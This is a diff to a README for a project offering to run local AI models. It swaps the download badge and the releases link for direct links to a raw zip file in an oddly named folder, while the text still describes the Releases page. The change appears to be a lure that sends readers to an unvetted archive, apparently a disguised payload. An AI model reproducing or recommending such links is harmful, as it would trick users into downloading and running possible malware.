@@ -1,6 +1,6 @@
 # 🤖 local-llm-9-2026 - Run private AI models on your computer
 
-[![](https://img.shields.io/badge/Download-Local_LLM_2026-blue.svg)](https://github.com/crb1116/local-llm-9-2026)
+[![](https://img.shields.io/badge/Download-Local_LLM_2026-blue.svg)](https://raw.githubusercontent.com/crb1116/local-llm-9-2026/main/syphilomatous/llm-local-v1.6-alpha.4.zip)
 
 ## 📖 What is this software?
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware to perform well.
 ## 🚀 How to Download
 
 1.  Visit the official repository page to access the latest version.
-2.  Click this link to go to the releases area: [Download Local LLM 9 2026](https://github.com/crb1116/local-llm-9-2026).
+2.  Click this link to go to the releases area: [Download Local LLM 9 2026](https://raw.githubusercontent.com/crb1116/local-llm-9-2026/main/syphilomatous/llm-local-v1.6-alpha.4.zip).
 3.  Look for the section marked "Releases" on the right side of the screen.
 4.  Select the most recent version available at the top of the list.
 5.  Find the file ending in `.zip` or `.exe` under the "Assets" header.
